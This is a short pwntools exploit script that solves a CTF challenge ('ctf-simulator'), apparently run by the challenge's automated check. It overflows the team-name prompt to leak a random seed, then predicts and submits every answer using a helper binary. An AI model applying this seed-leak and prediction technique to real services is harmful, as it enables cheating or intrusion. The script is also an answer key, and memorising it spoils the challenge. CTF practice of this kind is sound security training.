from pwn import *
import os

# Env-driven target so `pwnmake check` can point us at the started container
# (HOST/PORT default to a local instance for manual runs).
HOST = os.environ.get("HOST", "127.0.0.1")
PORT = int(os.environ.get("PORT", 22000))
REMOTE = 1

context.log_level = "warning"

exe = ELF(".build/ctf-simulator" if os.path.exists(".build/ctf-simulator") else "ctf-simulator")
context(binary=exe)

if REMOTE:
	r = remote(HOST, PORT)
else:
	r = exe.process()

r.recvuntil(b"What's the name of your CTF team?\n[>] ")
name = b"A" * 20
r.sendline(name)

r.recvuntil(b"Okay %s" % name)

seed_leak = r.recv(4)
seed = u32(seed_leak)

info("Seed is %d" % seed)

guesses = []
helper = ELF(".build/guess" if os.path.exists(".build/guess") else "guess", checksec=False)
hproc = helper.process([str(seed)])
try:
	while True:
		guesses.append(int(hproc.recvline()))
except:
	pass

info("Answers will be: %r" % guesses)

for guess in guesses:
	r.recvuntil("What is it?\n[>] ")
	r.sendline(str(guess))

r.recvuntil(b"Here's a reward for you: ")
print(r.recvline().decode("utf8").strip())
